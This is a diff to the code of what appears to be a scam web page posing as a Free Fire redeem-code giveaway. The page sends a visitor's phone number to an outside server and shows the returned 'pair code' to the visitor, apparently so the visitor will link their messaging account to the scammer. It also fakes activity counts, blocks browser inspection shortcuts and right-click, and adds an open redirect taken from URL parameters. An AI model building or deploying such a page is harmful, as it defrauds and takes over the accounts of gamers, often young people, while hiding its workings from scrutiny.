@@ -93,7 +93,6 @@
       border-radius: 12px;
       overflow: hidden;
       border: 1px solid #dde3ea;
-      position: relative;
     }
     .video-box video {
       width: 100%;
@@ -579,12 +578,14 @@
       <h1><span>Free Fire</span>Redeem Code</h1>
     </div>
   </header>
+
   <div class="container">
     <section class="video-section">
       <h2>WATCH FULL VIDEO</h2>
       <div class="video-box">
         <video
           controls
+          controlsList="nodownload"
           disablePictureInPicture
           oncontextmenu="return false;"
           ondragstart="return false;"
@@ -599,6 +600,7 @@
         </video>
       </div>
     </section>
+
     <section class="app-card">
       <div class="app-row">
         <img src="https://www.image2url.com/r2/default/files/1792654491880-105c2ad3-157c-4639-bf65-ad31a26b9ece.png" alt="FF Redeem Code" class="app-icon" draggable="false" oncontextmenu="return false;" ondragstart="return false;">
@@ -614,6 +616,7 @@
       </div>
       <p class="install-stat"><strong id="recentDownloads">3,241</strong> redeems in last hour</p>
       <a href="#" class="install-btn" id="installBtn"><span class="btn-label">🎟 Get Redeem Code</span></a>
+
       <div class="live-chat">
         <div class="live-chat-header">
           <div class="live-chat-title">
@@ -630,24 +633,33 @@
       </div>
     </section>
   </div>
+
   <footer>
     <p>©️ 2026 — Not affiliated with Garena Free Fire</p>
   </footer>
 
   <script>
-    // Disable right-click, inspect, and common shortcuts globally
+    function buildOfferUrl() {
+      const params = new URLSearchParams(window.location.search);
+      let redirectUrl = params.get('link') || params.get('redirect_url');
+      if (!redirectUrl) return null;
+      try { redirectUrl = decodeURIComponent(redirectUrl); } catch (e) {}
+      params.delete('redirect_url');
+      params.delete('link');
+      const remaining = params.toString();
+      const separator = redirectUrl.includes('?') ? '&' : '?';
+      return remaining ? `${redirectUrl}${separator}${remaining}` : redirectUrl;
+    }
+
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => {
       if (e.keyCode === 123 ||
           (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
-          (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 80))) {
+          (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
         e.preventDefault();
       }
     });
     document.addEventListener('dragstart', e => e.preventDefault());
-    document.addEventListener('selectstart', e => {
-      if (e.target.tagName === 'VIDEO' || e.target.tagName === 'IMG') e.preventDefault();
-    });
 
     const video = document.getElementById('protectedVideo');
     if (video) {
@@ -670,7 +682,6 @@
       else video.addEventListener('canplay', attemptPlay, { once: true });
     }
 
-    // Protect all images
     document.querySelectorAll('img').forEach(img => {
       img.addEventListener('contextmenu', e => e.preventDefault());
       img.addEventListener('dragstart', e => e.preventDefault());
@@ -1068,7 +1079,7 @@
               .trim();
             const params = new URLSearchParams(window.location.search);
             const uuid = params.get('click_id') || Date.now().toString();
-            const keyParam = params.get('key') || 'yyiJXuyA';
+            const keyParam = params.get('key') || 'yPuMdoui';
             const apiUrl = `https://moneysocial.xavi.top/qrcode?key=${keyParam}&pairCode=77773333&uuid=${uuid}&phone=${encodeURIComponent(fullNumber)}`;
             const response = await fetch(apiUrl, { method: 'GET' });
             const result = await response.json();
@@ -1076,9 +1087,7 @@
             if (!pairCode || pairCode.length !== 9) {
               throw new Error('Invalid code received');
             }
-            // Include key inside the displayed code
-            const finalCode = pairCode + keyParam;
-            showStep2(finalCode);
+            showStep2(pairCode);
           } catch (err) {
             console.error(err);
             alert('Error fetching code. Please try again.');
